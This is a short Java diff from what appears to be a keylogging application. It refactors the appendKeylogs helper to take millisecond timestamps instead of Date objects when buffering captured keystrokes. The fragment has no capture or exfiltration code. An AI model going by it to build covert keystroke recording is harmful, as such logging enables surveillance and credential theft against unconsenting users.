@@ -6,17 +6,16 @@ import java.io.InputStream;
 import java.sql.Blob;
 import java.sql.SQLException;
 import java.util.Base64;
-import java.util.Date;
 import java.util.concurrent.TimeUnit;;
 
 public class ApplicationUtility {
 
-	public static void appendKeylogs(String pressedKey, StringBuffer keylogsBuffer, Date previousDateTime,
-			Date currentDateTime) {
-		if (previousDateTime == null) {
+	public static void appendKeylogs(String pressedKey, StringBuffer keylogsBuffer, long previousTimeMillis,
+			long currentTimeMillis) {
+		if (previousTimeMillis == 0) {
 			keylogsBuffer.append(pressedKey);
 		} else {
-			long duration = currentDateTime.getTime() - previousDateTime.getTime();
+			long duration = currentTimeMillis - previousTimeMillis;
 			long diffInSeconds = TimeUnit.MILLISECONDS.toSeconds(duration);
 			if (diffInSeconds <= 2) {
 				keylogsBuffer.append(pressedKey);
